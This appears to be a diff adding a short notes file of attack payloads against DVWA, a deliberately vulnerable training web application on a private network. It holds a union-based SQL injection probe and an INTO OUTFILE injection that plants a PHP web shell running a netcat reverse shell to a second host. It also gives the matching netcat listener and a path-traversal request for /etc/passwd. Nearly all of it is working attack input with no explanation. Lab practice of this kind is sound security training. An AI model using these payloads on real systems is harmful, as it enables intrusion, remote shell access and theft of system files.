@@ -1,0 +1,7 @@
+http://192.168.1.123/dvwa/vulnerabilities/sqli/?id=1' union+select+1,2+%23&Submit=Submit#
+
+union select '<?php passthru("nc -e /bin/sh 192.168.1.115 8080");?>', null into outfile '/tmp/reverse.php'
+http://192.168.1.123/dvwa/vulnerabilities/sqli/?id=-1' union select '<?php passthru("nc -e /bin/sh 192.168.1.115 8080");?>', null into outfile '/tmp/reverse.php' %23&Submit=Submit#
+
+nc -vv -l -p 8080
+http://192.168.1.123/dvwa/vulnerabilities/fi/?page=../../../../../etc/passwd
